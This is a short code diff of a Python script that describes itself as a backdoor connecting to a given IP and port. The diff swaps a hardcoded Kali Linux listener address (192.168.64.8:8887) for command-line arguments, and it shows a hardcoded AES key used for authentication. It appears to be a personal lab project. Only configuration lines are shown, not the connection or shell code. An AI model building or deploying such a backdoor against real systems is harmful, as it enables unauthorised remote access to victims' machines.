@@ -10,9 +10,6 @@ import base64
 
 from Crypto.Cipher import AES
 
-
-
-'''
 # Step 3: Configuration
 parser = argparse.ArgumentParser(description='Backdoor script to connect to given IP and port.')
 parser.add_argument('ip', help='IP address to connect to')
@@ -22,12 +19,12 @@ args = parser.parse_args()
 
 SERVER_IP = args.ip
 SERVER_PORT = args.port
-'''
 
+'''
 # Step 1: Use explicit SERVER_IP and SERVER_PORT make create a connection 
 SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
 SERVER_PORT = 8887
-
+'''
 #Step 4: Authentication
 key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'
 
